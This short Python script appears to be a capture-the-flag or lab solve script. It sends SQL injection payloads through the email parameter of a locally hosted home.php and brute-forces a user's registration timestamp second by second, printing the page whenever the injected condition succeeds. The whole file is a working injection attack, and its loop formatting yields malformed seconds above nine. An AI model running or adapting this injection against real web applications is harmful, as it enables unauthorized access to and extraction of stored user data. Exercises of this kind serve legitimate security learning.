import requests
host = 'http://127.0.0.1:8088/home.php?username=aaa&email='
for i in range(4, 60):
    url = f"{host}as\\' or regdate like timestamp \\'2021@05@24 03@12@0{i}"
    res = requests.get(url)
    if ":(" not in res.text:
        print(res.text)
        print(i)
        print(url)
    else:
        print(f"{i} fail ;-;")

for j in range(0, 60):
    url = f"{host}as\\' or regdate like timestamp \\'2021@05@24 03@13@0{j}"
    res = requests.get(url)
    if ":(" not in res.text:
        print(res.text)
        print(j)
    else:
        print(f"{j} fail ;-;")

for k in range(0, 4):
    url = f"{host}as\\' or regdate like timestamp \\'2021@05@24 03@14@0{k}"
    res = requests.get(url)
    if ":(" not in res.text:
        print(res.text)
        print(k)
    else:
        print(f"{k} fail ;-;")
